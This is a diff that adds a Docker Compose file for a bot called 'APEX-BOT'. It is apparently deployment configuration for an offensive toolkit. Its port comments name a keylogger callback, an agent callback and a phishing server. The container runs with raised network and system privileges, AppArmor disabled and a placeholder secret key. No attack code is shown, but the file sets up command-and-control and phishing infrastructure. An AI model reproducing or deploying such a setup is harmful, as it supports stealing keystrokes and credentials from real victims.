@@ -1,0 +1,53 @@
+# docker-compose.yml for APEX-BOT v5.0.0
+version: '3.8'
+
+services:
+  apex-bot:
+    build: .
+    container_name: apex-bot
+    restart: unless-stopped
+    ports:
+      - "5000:5000"   # Web Dashboard
+      - "4444:4444"   # Keylogger callback
+      - "5555:5555"   # Agent callback
+      - "8080:8080"   # Phishing server
+      - "8888:8888"   # SSH management
+    volumes:
+      - ./apex_data:/app/.apex_bot
+      - ./apex_reports:/app/apex_reports
+      - ./apex_logs:/app/logs
+    environment:
+      - APEX_ENV=production
+      - APEX_HOST=0.0.0.0
+      - APEX_PORT=5000
+      - APEX_DEBUG=false
+      - APEX_SECRET_KEY=${APEX_SECRET_KEY:-change_me_in_production}
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+      - SYS_ADMIN
+    security_opt:
+      - apparmor:unconfined
+    networks:
+      - apex-network
+
+  apex-monitor:
+    image: prom/node-exporter:latest
+    container_name: apex-monitor
+    restart: unless-stopped
+    ports:
+      - "9100:9100"
+    volumes:
+      - /proc:/host/proc:ro
+      - /sys:/host/sys:ro
+      - /:/rootfs:ro
+    command:
+      - '--path.procfs=/host/proc'
+      - '--path.sysfs=/host/sys'
+      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)'
+    networks:
+      - apex-network
+
+networks:
+  apex-network:
+    driver: bridge
